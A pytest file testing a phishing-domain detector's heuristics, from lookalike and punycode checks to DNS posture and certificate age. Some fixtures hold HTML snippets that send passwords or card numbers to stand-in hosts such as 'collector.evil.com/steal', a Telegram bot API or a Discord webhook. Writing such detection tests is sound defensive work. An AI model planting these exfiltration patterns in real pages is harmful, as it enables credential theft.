"""Unit tests for src/heuristics.py: all 25 heuristics and HeuristicUtils."""

from datetime import datetime, timedelta, timezone

import pytest

from src.enricher import CnameInfo, CtInfo, DNSInfo, FaviconInfo, RegistrationInfo
from src.heuristics import (
    BrandContentDensityHeuristic,
    BrandLookalikeHeuristic,
    BulletproofHostHeuristic,
    CertAgeHeuristic,
    CtHistoryHeuristic,
    DnsEmailPostureHeuristic,
    DomainAgeHeuristic,
    FaviconBrandMismatchHeuristic,
    ForbiddenTokensHeuristic,
    FormsExfilHeuristic,
    FreemailMxHeuristic,
    HeuristicUtils,
    HttpsLoginHeuristic,
    InactiveHeuristic,
    LongLivedVerifiedHeuristic,
    MissingSecurityHeadersHeuristic,
    ParkingHeuristic,
    PhishingKitHeuristic,
    PunycodeHeuristic,
    RedirectCloakingHeuristic,
    ReverseDnsMismatchHeuristic,
    RobotsTxtHeuristic,
    SubdomainDepthHeuristic,
    SuspiciousTldHeuristic,
    TitleBrandMismatchHeuristic,
    TlsCertHeuristic,
)


# ---------------------------------------------------------------------------
# HeuristicUtils
# ---------------------------------------------------------------------------

class TestHeuristicUtils:
    """Tests for shared static helper methods."""

    # levenshtein
    def test_levenshtein_equal_strings(self):
        assert HeuristicUtils.levenshtein("abc", "abc") == 0

    def test_levenshtein_insertion(self):
        assert HeuristicUtils.levenshtein("abc", "abcd") == 1

    def test_levenshtein_deletion(self):
        assert HeuristicUtils.levenshtein("abcd", "abc") == 1

    def test_levenshtein_substitution(self):
        assert HeuristicUtils.levenshtein("abc", "axc") == 1

    def test_levenshtein_empty_vs_string(self):
        assert HeuristicUtils.levenshtein("", "abc") == 3

    def test_levenshtein_both_empty(self):
        assert HeuristicUtils.levenshtein("", "") == 0

    # confusable_distance
    def test_confusable_distance_cyrillic_a(self):
        # Cyrillic 'а' (U+0430) maps to Latin 'a'
        assert HeuristicUtils.confusable_distance("а", "a") == 0

    def test_confusable_distance_digit_zero(self):
        # '0' maps to 'o'
        assert HeuristicUtils.confusable_distance("d0s", "dos") == 0

    def test_confusable_distance_identical(self):
        assert HeuristicUtils.confusable_distance("dbs", "dbs") == 0

    def test_confusable_distance_unrelated_strings(self):
        dist = HeuristicUtils.confusable_distance("xyz", "dbs")
        assert dist > 0

    # content_diff_ratio
    def test_content_diff_ratio_identical(self):
        assert HeuristicUtils.content_diff_ratio("hello world", "hello world") == 0.0

    def test_content_diff_ratio_no_overlap(self):
        assert HeuristicUtils.content_diff_ratio("hello world", "foo bar baz") == 1.0

    def test_content_diff_ratio_both_empty(self):
        assert HeuristicUtils.content_diff_ratio("", "") == 0.0

    def test_content_diff_ratio_one_empty(self):
        assert HeuristicUtils.content_diff_ratio("hello", "") == 1.0

    def test_content_diff_ratio_partial_overlap(self):
        ratio = HeuristicUtils.content_diff_ratio("hello world", "hello there")
        assert 0.0 < ratio < 1.0

    # looks_base64
    def test_looks_base64_valid(self):
        import base64
        s = base64.b64encode(b"hello world " * 5).decode("ascii")
        assert HeuristicUtils.looks_base64(s) is True

    def test_looks_base64_invalid_length(self):
        assert HeuristicUtils.looks_base64("abc") is False

    def test_looks_base64_invalid_chars(self):
        assert HeuristicUtils.looks_base64("!@#$") is False

    # to_ascii
    def test_to_ascii_plain_ascii(self):
        assert HeuristicUtils.to_ascii("example.com") == "example.com"

    def test_to_ascii_unicode_host(self):
        result = HeuristicUtils.to_ascii("münchen.de")
        assert "xn--" in result

    def test_to_ascii_returns_original_on_failure(self):
        # A string that can't be IDNA encoded is returned as-is
        result = HeuristicUtils.to_ascii("invalid..host")
        assert isinstance(result, str)

    # registrable
    def test_registrable_extracts_etld1(self):
        assert HeuristicUtils.registrable("sub.example.co.uk") == "example.co.uk"

    def test_registrable_simple_domain(self):
        assert HeuristicUtils.registrable("example.com") == "example.com"

    # domain_belongs_to_brand
    def test_domain_belongs_to_brand_true(self):
        from src.config import Brand
        brand = Brand(name="TestBrand", canonical_domains=["testbrand.com"], domain_match_keywords=[], domain_exclude_keywords=[])
        assert HeuristicUtils.domain_belongs_to_brand("app.testbrand.com", brand) is True

    def test_domain_belongs_to_brand_false(self):
        from src.config import Brand
        brand = Brand(name="TestBrand", canonical_domains=["testbrand.com"], domain_match_keywords=[], domain_exclude_keywords=[])
        assert HeuristicUtils.domain_belongs_to_brand("evil.com", brand) is False

    def test_domain_belongs_to_brand_exact_match(self):
        from src.config import Brand
        brand = Brand(name="TestBrand", canonical_domains=["testbrand.com"], domain_match_keywords=[], domain_exclude_keywords=[])
        assert HeuristicUtils.domain_belongs_to_brand("testbrand.com", brand) is True


# ---------------------------------------------------------------------------
# InactiveHeuristic
# ---------------------------------------------------------------------------

class TestInactiveHeuristic:
    """Tests for InactiveHeuristic."""

    def test_non_200_status_is_benign(self, make_context):
        ctx = make_context(status=404)
        result = InactiveHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True

    def test_500_status_is_benign(self, make_context):
        ctx = make_context(status=500)
        result = InactiveHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True

    def test_301_redirect_status_is_benign(self, make_context):
        ctx = make_context(status=301)
        result = InactiveHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True

    def test_200_with_dns_records_is_neutral(self, make_context):
        ctx = make_context(status=200, a_records=["1.2.3.4"])
        result = InactiveHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is False
        assert result.is_scam_definitive is False
        assert result.suspicious is False

    def test_200_no_dns_records_is_benign(self, make_context):
        ctx = make_context(status=200, a_records=[], aaaa_records=[], mx=[], ns=[])
        result = InactiveHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True


# ---------------------------------------------------------------------------
# ParkingHeuristic
# ---------------------------------------------------------------------------

class TestParkingHeuristic:
    """Tests for ParkingHeuristic.

    TEST_CONFIG has parking_signatures=["domain for sale"].
    """

    def test_parking_signature_in_html_is_benign(self, make_context):
        ctx = make_context(html="Welcome! This domain for sale. Contact us.")
        result = ParkingHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True

    def test_parking_server_header_is_benign(self, make_context):
        ctx = make_context(headers={"server": "sedo parking"})
        result = ParkingHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True

    def test_bodis_server_header_is_benign(self, make_context):
        ctx = make_context(headers={"server": "bodis"})
        result = ParkingHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True

    def test_no_signals_is_neutral(self, make_context):
        ctx = make_context(html="Welcome to our website.", headers={})
        result = ParkingHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is False

    def test_case_insensitive_html_match(self, make_context):
        ctx = make_context(html="DOMAIN FOR SALE - contact owner")
        result = ParkingHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True


# ---------------------------------------------------------------------------
# LongLivedVerifiedHeuristic
# ---------------------------------------------------------------------------

class TestLongLivedVerifiedHeuristic:
    """Tests for LongLivedVerifiedHeuristic."""

    def test_ov_cert_with_org_is_benign(self, make_context):
        ctx = make_context(cert_org="Acme Corp.")
        result = LongLivedVerifiedHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True

    def test_hsts_header_is_benign(self, make_context):
        ctx = make_context(headers={"strict-transport-security": "max-age=31536000"})
        result = LongLivedVerifiedHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is True

    def test_no_org_no_hsts_is_neutral(self, make_context):
        ctx = make_context()
        result = LongLivedVerifiedHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is False

    def test_cert_error_overrides_org(self, make_context):
        # cert.error is set, so org should be ignored
        ctx = make_context(cert_org="Acme Corp.", cert_error="timeout")
        result = LongLivedVerifiedHeuristic().evaluate(ctx)
        assert result.is_benign_definitive is False


# ---------------------------------------------------------------------------
# FormsExfilHeuristic
# ---------------------------------------------------------------------------

class TestFormsExfilHeuristic:
    """Tests for FormsExfilHeuristic."""

    def test_password_field_and_telegram_is_definitive_scam(self, make_context):
        html = '<input type="password" name="pass"> <script>fetch("api.telegram.org/bot...")</script>'
        ctx = make_context(html=html)
        result = FormsExfilHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is True

    def test_password_and_cross_domain_post_is_definitive_scam(self, make_context):
        html = '<form action="https://collector.evil.com/steal"><input type="password"></form>'
        ctx = make_context(html=html, host="victim-brand.com")
        result = FormsExfilHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is True

    def test_password_field_alone_is_suspicious(self, make_context):
        html = '<input type="password" name="pass">'
        ctx = make_context(html=html)
        result = FormsExfilHeuristic().evaluate(ctx)
        assert result.suspicious is True
        assert result.is_scam_definitive is False

    def test_otp_reference_is_suspicious(self, make_context):
        html = "Please enter your 2fa code to continue."
        ctx = make_context(html=html)
        result = FormsExfilHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_wallet_hook_is_suspicious(self, make_context):
        html = "<script>window.ethereum.enable()</script>"
        ctx = make_context(html=html)
        result = FormsExfilHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_clean_html_is_neutral(self, make_context):
        ctx = make_context(html="<html><body>Hello world</body></html>")
        result = FormsExfilHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is False
        assert result.is_benign_definitive is False
        assert result.suspicious is False

    def test_discord_webhook_with_password_is_definitive_scam(self, make_context):
        html = '<input type="password"> <script>fetch("discord.com/api/webhooks/123")</script>'
        ctx = make_context(html=html)
        result = FormsExfilHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is True

    def test_cc_field_with_exfil_is_definitive_scam(self, make_context):
        html = '<input name="ccnum"> <script>fetch("mailto:thief@evil.com")</script>'
        ctx = make_context(html=html)
        result = FormsExfilHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is True


# ---------------------------------------------------------------------------
# PhishingKitHeuristic
# ---------------------------------------------------------------------------

class TestPhishingKitHeuristic:
    """Tests for PhishingKitHeuristic.

    TEST_CONFIG has kit_paths=["/owa"].
    """

    def test_kit_comment_is_definitive_scam(self, make_context):
        html = "<!-- phishing kit by l33t phisher -->"
        ctx = make_context(html=html)
        result = PhishingKitHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is True

    def test_tg_deep_link_is_definitive_scam(self, make_context):
        html = '<a href="tg://resolve?domain=scammer">Contact</a>'
        ctx = make_context(html=html)
        result = PhishingKitHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is True

    def test_kit_path_in_url_is_suspicious(self, make_context):
        ctx = make_context(html="normal page", final_url="http://evil.com/owa/login")
        result = PhishingKitHeuristic().evaluate(ctx)
        assert result.suspicious is True
        assert result.is_scam_definitive is False

    def test_clean_domain_is_neutral(self, make_context):
        ctx = make_context(html="normal page", final_url="http://evil.com/home")
        result = PhishingKitHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is False
        assert result.suspicious is False

    def test_kit_comment_overrides_no_path_hit(self, make_context):
        html = "<!-- by elite phisher -->"
        ctx = make_context(html=html, final_url="http://evil.com/home")
        result = PhishingKitHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is True


# ---------------------------------------------------------------------------
# BrandLookalikeHeuristic
# ---------------------------------------------------------------------------

class TestBrandLookalikeHeuristic:
    """Tests for BrandLookalikeHeuristic.

    TEST_CONFIG: brand name "TestBrand", valid_domains=["testbrand.com"].
    """

    def test_close_lookalike_is_suspicious(self, make_context):
        # "testbr4nd" is 1 edit from "testbrand"
        ctx = make_context(domain="testbr4nd.com", host="testbr4nd.com", registrable="testbr4nd.com")
        result = BrandLookalikeHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_unrelated_long_domain_is_neutral(self, make_context):
        # First label "aaaabbbbccccddddeeeeffff" (24 chars) → distance to "testbrand" (9) > 10
        ctx = make_context(
            domain="aaaabbbbccccddddeeeeffff.com",
            host="aaaabbbbccccddddeeeeffff.com",
            registrable="aaaabbbbccccddddeeeeffff.com",
        )
        result = BrandLookalikeHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_exact_brand_name_as_host_is_suspicious(self, make_context):
        # The heuristic doesn't exclude brand's own domains; distance=0 ≤ 10 → suspicious
        ctx = make_context(domain="testbrand.com", host="testbrand.com", registrable="testbrand.com")
        result = BrandLookalikeHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_brand_domain_first_label_close_match(self, make_context):
        # "testbran1.com" → first label "testbran1" vs "testbrand" → distance=1 → suspicious
        ctx = make_context(domain="testbran1.com", host="testbran1.com", registrable="testbran1.com")
        result = BrandLookalikeHeuristic().evaluate(ctx)
        assert result.suspicious is True


# ---------------------------------------------------------------------------
# PunycodeHeuristic
# ---------------------------------------------------------------------------

class TestPunycodeHeuristic:
    """Tests for PunycodeHeuristic."""

    def test_punycode_prefix_is_suspicious(self, make_context):
        ctx = make_context(host="xn--dbs-abc.com")
        result = PunycodeHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_punycode_in_subdomain_is_suspicious(self, make_context):
        ctx = make_context(host="login.xn--dbs.com")
        result = PunycodeHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_plain_ascii_is_neutral(self, make_context):
        ctx = make_context(host="evil-testbrand.com")
        result = PunycodeHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_empty_host_is_neutral(self, make_context):
        ctx = make_context(host="")
        result = PunycodeHeuristic().evaluate(ctx)
        assert result.suspicious is False


# ---------------------------------------------------------------------------
# ForbiddenTokensHeuristic
# ---------------------------------------------------------------------------

class TestForbiddenTokensHeuristic:
    """Tests for ForbiddenTokensHeuristic.

    TEST_CONFIG has forbidden_keywords=["login", "verify"].
    """

    def test_forbidden_token_in_host_is_suspicious(self, make_context):
        ctx = make_context(host="login-testbrand.com")
        result = ForbiddenTokensHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_forbidden_token_in_html_is_suspicious(self, make_context):
        ctx = make_context(html="Please verify your account to continue.", host="clean.example.com")
        result = ForbiddenTokensHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_no_forbidden_tokens_is_neutral(self, make_context):
        ctx = make_context(host="shop.example.com", html="Buy our products today.")
        result = ForbiddenTokensHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_multiple_forbidden_tokens_still_one_result(self, make_context):
        ctx = make_context(host="login-verify.example.com")
        result = ForbiddenTokensHeuristic().evaluate(ctx)
        assert result.suspicious is True


# ---------------------------------------------------------------------------
# RedirectCloakingHeuristic
# ---------------------------------------------------------------------------

class TestRedirectCloakingHeuristic:
    """Tests for RedirectCloakingHeuristic."""

    def test_two_redirects_is_suspicious(self, make_context):
        ctx = make_context(history=[301, 302])
        result = RedirectCloakingHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_single_redirect_is_neutral(self, make_context):
        ctx = make_context(history=[301])
        result = RedirectCloakingHeuristic().evaluate(ctx)
        # 1 redirect is < 2 threshold, and diff ratio should be 0 for same html
        assert result.suspicious is False

    def test_ua_cloaking_high_diff_ratio_is_suspicious(self, make_context):
        # Primary and alternative pages completely different (> 500 chars each)
        primary_html = "word1 " * 200  # 1200 chars, unique tokens
        alt_html = "thing1 " * 200     # 1200 chars, unique tokens, no overlap
        ctx = make_context(html=primary_html, alt_html=alt_html)
        result = RedirectCloakingHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_identical_responses_neutral(self, make_context):
        html = "same content " * 100
        ctx = make_context(html=html, alt_html=html)
        result = RedirectCloakingHeuristic().evaluate(ctx)
        # No redirects and diff_ratio=0 → neutral
        assert result.suspicious is False

    def test_small_different_pages_neutral(self, make_context):
        # Pages are different but too short (< 500 chars each) → no cloaking signal
        ctx = make_context(html="hello world", alt_html="foo bar baz")
        result = RedirectCloakingHeuristic().evaluate(ctx)
        # diff_ratio > 0.5 but len < 500 → neutral
        assert result.suspicious is False

    def test_no_redirects_neutral(self, make_context):
        html = "same content " * 10
        ctx = make_context(html=html, alt_html=html, history=[])
        result = RedirectCloakingHeuristic().evaluate(ctx)
        assert result.suspicious is False


# ---------------------------------------------------------------------------
# CertAgeHeuristic
# ---------------------------------------------------------------------------

class TestCertAgeHeuristic:
    """Tests for CertAgeHeuristic."""

    def _format_date(self, dt: datetime) -> str:
        return dt.strftime("%b %d %H:%M:%S %Y UTC")

    def test_fresh_cert_under_30_days_is_suspicious(self, make_context):
        ten_days_ago = datetime.now(timezone.utc) - timedelta(days=10)
        ctx = make_context(cert_not_before=self._format_date(ten_days_ago))
        result = CertAgeHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_old_cert_over_30_days_is_neutral(self, make_context):
        sixty_days_ago = datetime.now(timezone.utc) - timedelta(days=60)
        ctx = make_context(cert_not_before=self._format_date(sixty_days_ago))
        result = CertAgeHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_cert_is_neutral(self, make_context):
        ctx = make_context()
        ctx.cert = None
        result = CertAgeHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_cert_with_error_is_neutral(self, make_context):
        ten_days_ago = datetime.now(timezone.utc) - timedelta(days=10)
        ctx = make_context(
            cert_not_before=self._format_date(ten_days_ago),
            cert_error="connection timeout",
        )
        result = CertAgeHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_malformed_date_is_neutral(self, make_context):
        ctx = make_context(cert_not_before="INVALID_DATE_FORMAT")
        result = CertAgeHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_exactly_30_days_is_neutral(self, make_context):
        thirty_days_ago = datetime.now(timezone.utc) - timedelta(days=30)
        ctx = make_context(cert_not_before=self._format_date(thirty_days_ago))
        result = CertAgeHeuristic().evaluate(ctx)
        assert result.suspicious is False


# ---------------------------------------------------------------------------
# BrandContentDensityHeuristic
# ---------------------------------------------------------------------------

class TestBrandContentDensityHeuristic:
    """Tests for BrandContentDensityHeuristic.

    TEST_CONFIG: brand name "TestBrand", valid_domains=["testbrand.com"].
    Brand keywords extracted: {"testbrand"}.
    """

    def test_high_density_on_non_brand_domain_is_suspicious(self, make_context):
        # 20 "testbrand" tokens out of 40 total words = 50% density > 5%
        html = "testbrand " * 20 + "other " * 20
        ctx = make_context(host="phishing.example.com", html=html, registrable="example.com")
        result = BrandContentDensityHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_host_is_known_brand_domain_is_neutral(self, make_context):
        html = "testbrand " * 20 + "other " * 20
        ctx = make_context(host="testbrand.com", html=html, registrable="testbrand.com")
        result = BrandContentDensityHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_low_density_is_neutral(self, make_context):
        # 2 "testbrand" out of 200 words = 1% density < 5%
        html = "testbrand " * 2 + "filler " * 198
        ctx = make_context(host="phishing.example.com", html=html, registrable="example.com")
        result = BrandContentDensityHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_empty_html_is_neutral(self, make_context):
        ctx = make_context(host="phishing.example.com", html="", registrable="example.com")
        result = BrandContentDensityHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_subdomain_of_brand_is_neutral(self, make_context):
        html = "testbrand " * 20 + "other " * 20
        ctx = make_context(host="app.testbrand.com", html=html, registrable="testbrand.com")
        result = BrandContentDensityHeuristic().evaluate(ctx)
        assert result.suspicious is False


# ---------------------------------------------------------------------------
# HttpsLoginHeuristic
# ---------------------------------------------------------------------------

class TestHttpsLoginHeuristic:
    """Tests for HttpsLoginHeuristic."""

    def test_password_on_http_is_suspicious(self, make_context):
        html = '<form><input type="password" name="pass"></form>'
        ctx = make_context(html=html, final_url="http://evil.example.com/login")
        result = HttpsLoginHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_password_on_https_is_neutral(self, make_context):
        html = '<form><input type="password" name="pass"></form>'
        ctx = make_context(html=html, final_url="https://evil.example.com/login")
        result = HttpsLoginHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_password_field_is_neutral(self, make_context):
        html = "<html><body>Welcome</body></html>"
        ctx = make_context(html=html, final_url="http://evil.example.com/")
        result = HttpsLoginHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_password_field_case_insensitive(self, make_context):
        html = "<input TYPE='PASSWORD' name='p'>"
        ctx = make_context(html=html, final_url="http://evil.example.com/")
        result = HttpsLoginHeuristic().evaluate(ctx)
        assert result.suspicious is True


# ---------------------------------------------------------------------------
# DnsEmailPostureHeuristic
# ---------------------------------------------------------------------------

class TestDnsEmailPostureHeuristic:
    """Tests for DnsEmailPostureHeuristic."""

    def test_fast_flux_many_a_records_is_suspicious(self, make_context):
        ctx = make_context(a_records=["1.1.1.1", "2.2.2.2", "3.3.3.3", "4.4.4.4", "5.5.5.5"])
        result = DnsEmailPostureHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_low_ttl_is_suspicious(self, make_context):
        ctx = make_context(a_records=["1.1.1.1"], ttl_min=60)
        result = DnsEmailPostureHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_mx_with_weak_spf_is_suspicious(self, make_context):
        ctx = make_context(mx=["mail.example.com"], spf=["v=spf1 +all"])
        result = DnsEmailPostureHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_no_dmarc_with_mx_is_suspicious(self, make_context):
        ctx = make_context(mx=["mail.example.com"], dmarc=[])
        result = DnsEmailPostureHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_none_dns_is_neutral(self, make_context):
        ctx = make_context(dns_error="NXDOMAIN")
        result = DnsEmailPostureHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_clean_dns_is_neutral(self, make_context):
        # 1 A record, high TTL, no MX → no fast-flux, no email auth issues
        ctx = make_context(a_records=["1.2.3.4"], ttl_min=3600, mx=[])
        result = DnsEmailPostureHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_dmarc_p_none_with_mx_is_suspicious(self, make_context):
        ctx = make_context(mx=["mail.example.com"], dmarc=["v=DMARC1; p=none"])
        result = DnsEmailPostureHeuristic().evaluate(ctx)
        assert result.suspicious is True


# ---------------------------------------------------------------------------
# TlsCertHeuristic
# ---------------------------------------------------------------------------

class TestTlsCertHeuristic:
    """Tests for TlsCertHeuristic.

    TEST_CONFIG brand names: ["testbrand"].
    """

    def test_brand_name_in_cn_on_non_brand_host_is_suspicious(self, make_context):
        ctx = make_context(
            host="phishing.example.com",
            registrable="example.com",
            cert_cn="testbrand-secure-login",
        )
        result = TlsCertHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_brand_name_in_cn_on_brand_host_is_neutral(self, make_context):
        ctx = make_context(
            host="testbrand.com",
            registrable="testbrand.com",
            cert_cn="testbrand.com",
        )
        result = TlsCertHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_cert_is_neutral(self, make_context):
        ctx = make_context(host="phishing.example.com")
        ctx.cert = None
        result = TlsCertHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_cert_cn_does_not_contain_brand_is_neutral(self, make_context):
        ctx = make_context(host="phishing.example.com", cert_cn="unrelated-service.com")
        result = TlsCertHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_cert_with_error_is_neutral(self, make_context):
        ctx = make_context(host="phishing.example.com", cert_cn="testbrand-login", cert_error="timeout")
        result = TlsCertHeuristic().evaluate(ctx)
        assert result.suspicious is False


# ---------------------------------------------------------------------------
# SubdomainDepthHeuristic
# ---------------------------------------------------------------------------

class TestSubdomainDepthHeuristic:
    """Tests for SubdomainDepthHeuristic."""

    def test_three_labels_is_suspicious(self, make_context):
        ctx = make_context(host="login.brand.phish.com")
        result = SubdomainDepthHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_exactly_three_labels_is_suspicious(self, make_context):
        ctx = make_context(host="a.b.c")
        result = SubdomainDepthHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_two_labels_is_neutral(self, make_context):
        ctx = make_context(host="evil.com")
        result = SubdomainDepthHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_four_labels_is_suspicious(self, make_context):
        ctx = make_context(host="a.b.c.d")
        result = SubdomainDepthHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_empty_host_is_neutral(self, make_context):
        ctx = make_context(host="")
        result = SubdomainDepthHeuristic().evaluate(ctx)
        assert result.suspicious is False


# ---------------------------------------------------------------------------
# Group A — New heuristics (no additional I/O)
# ---------------------------------------------------------------------------

class TestSuspiciousTldHeuristic:
    """Tests for SuspiciousTldHeuristic.

    TEST_CONFIG has suspicious_tlds=["xyz", "tk"].
    """

    def test_xyz_tld_is_suspicious(self, make_context):
        ctx = make_context(host="evil-testbrand.xyz")
        result = SuspiciousTldHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_tk_tld_is_suspicious(self, make_context):
        ctx = make_context(host="phish-testbrand.tk")
        result = SuspiciousTldHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_com_tld_is_neutral(self, make_context):
        ctx = make_context(host="phish-testbrand.com")
        result = SuspiciousTldHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_unknown_tld_not_in_list_is_neutral(self, make_context):
        ctx = make_context(host="phish-testbrand.io")
        result = SuspiciousTldHeuristic().evaluate(ctx)
        assert result.suspicious is False


class TestTitleBrandMismatchHeuristic:
    """Tests for TitleBrandMismatchHeuristic.

    TEST_CONFIG has one brand: TestBrand, canonical_domains=["testbrand.com"].
    """

    def test_brand_name_in_title_on_non_brand_domain_is_suspicious(self, make_context):
        ctx = make_context(host="evil.com", html="<html><title>TestBrand Online Banking</title></html>")
        result = TitleBrandMismatchHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_brand_domain_not_flagged(self, make_context):
        ctx = make_context(
            host="testbrand.com",
            html="<html><title>TestBrand Online Banking</title></html>",
            registrable="testbrand.com",
        )
        result = TitleBrandMismatchHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_brand_name_in_title_is_neutral(self, make_context):
        ctx = make_context(host="evil.com", html="<html><title>Welcome to our site</title></html>")
        result = TitleBrandMismatchHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_title_tag_is_neutral(self, make_context):
        ctx = make_context(host="evil.com", html="<html><body>No title</body></html>")
        result = TitleBrandMismatchHeuristic().evaluate(ctx)
        assert result.suspicious is False


class TestMissingSecurityHeadersHeuristic:
    """Tests for MissingSecurityHeadersHeuristic."""

    def test_all_three_headers_absent_is_suspicious(self, make_context):
        ctx = make_context(status=200, headers={})
        result = MissingSecurityHeadersHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_one_header_present_is_neutral(self, make_context):
        ctx = make_context(status=200, headers={"x-frame-options": "DENY"})
        result = MissingSecurityHeadersHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_non_200_status_is_neutral(self, make_context):
        ctx = make_context(status=404, headers={})
        result = MissingSecurityHeadersHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_all_three_headers_present_is_neutral(self, make_context):
        ctx = make_context(status=200, headers={
            "content-security-policy": "default-src 'self'",
            "x-frame-options": "DENY",
            "x-content-type-options": "nosniff",
        })
        result = MissingSecurityHeadersHeuristic().evaluate(ctx)
        assert result.suspicious is False


class TestFreemailMxHeuristic:
    """Tests for FreemailMxHeuristic."""

    def test_gmail_mx_is_suspicious(self, make_context):
        ctx = make_context(mx=["aspmx.l.google.com"])
        result = FreemailMxHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_outlook_mx_is_suspicious(self, make_context):
        ctx = make_context(mx=["mail.protection.outlook.com"])
        result = FreemailMxHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_no_mx_is_neutral(self, make_context):
        ctx = make_context(mx=[])
        result = FreemailMxHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_corporate_mx_is_neutral(self, make_context):
        ctx = make_context(mx=["mail.testbrand.com"])
        result = FreemailMxHeuristic().evaluate(ctx)
        assert result.suspicious is False


# ---------------------------------------------------------------------------
# Group B — New heuristics (lightweight new I/O data)
# ---------------------------------------------------------------------------

class TestDomainAgeHeuristic:
    """Tests for DomainAgeHeuristic.

    TEST_CONFIG has new_domain_days=30.
    """

    def _fresh_iso(self, days_ago: int) -> str:
        dt = datetime.now(timezone.utc) - timedelta(days=days_ago)
        return dt.strftime("%Y-%m-%dT%H:%M:%SZ")

    def test_domain_registered_10_days_ago_is_suspicious(self, make_context):
        ctx = make_context(registration=RegistrationInfo(created=self._fresh_iso(10), registrar=None, error=None))
        result = DomainAgeHeuristic().evaluate(ctx)
        assert result.suspicious is True

    def test_domain_registered_60_days_ago_is_neutral(self, make_context):
        ctx = make_context(registration=RegistrationInfo(created=self._fresh_iso(60), registrar=None, error=None))
        result = DomainAgeHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_no_registration_data_is_neutral(self, make_context):
        ctx = make_context(registration=None)
        result = DomainAgeHeuristic().evaluate(ctx)
        assert result.suspicious is False

    def test_registration_error_is_neutral(self, make_context):
        ctx = make_context(registration=RegistrationInfo(created=None, registrar=None, error="timeout"))
        result = DomainAgeHeuristic().evaluate(ctx)
        assert result.suspicious is False


class TestFaviconBrandMismatchHeuristic:
    """Tests for FaviconBrandMismatchHeuristic.

    TEST_CONFIG has brand_favicon_hashes=[].  Tests override the config to inject a hash.
    """

    def test_sha1_in_config_hashes_is_definitive_scam(self, make_context, monkeypatch):
        import src.heuristics
        monkeypatch.setattr(
            src.heuristics.CONFIG.processor, "brand_favicon_hashes", ["abc123def456abc123def456abc123def456abc1"]
        )
        ctx = make_context(
            host="evil.com",
            favicon=FaviconInfo(sha1="abc123def456abc123def456abc123def456abc1", error=None),
        )
        result = FaviconBrandMismatchHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is True

    def test_sha1_not_in_list_is_neutral(self, make_context):
        ctx = make_context(
            host="evil.com",
            favicon=FaviconInfo(sha1="deadbeef" * 5, error=None),
        )
        result = FaviconBrandMismatchHeuristic().evaluate(ctx)
        assert result.is_scam_definitive is False
        assert result.suspicious is False

